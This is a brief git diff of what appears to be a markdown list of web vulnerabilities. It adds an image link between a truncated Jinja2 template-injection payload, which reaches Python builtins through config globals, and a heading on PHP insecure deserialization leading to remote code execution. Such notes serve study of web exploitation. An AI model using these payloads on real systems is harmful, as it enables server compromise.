@@ -106,6 +106,10 @@ x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem_
 
 -----------------
 
+![image](https://github.com/user-attachments/assets/4c5c3982-9e3b-49ac-8c9c-e83fccba294e)
+
+-----------------
+
 - Vulnerability-: Php Insecure Deserialization(Privesc to Remote Code Execution)
 - 
 
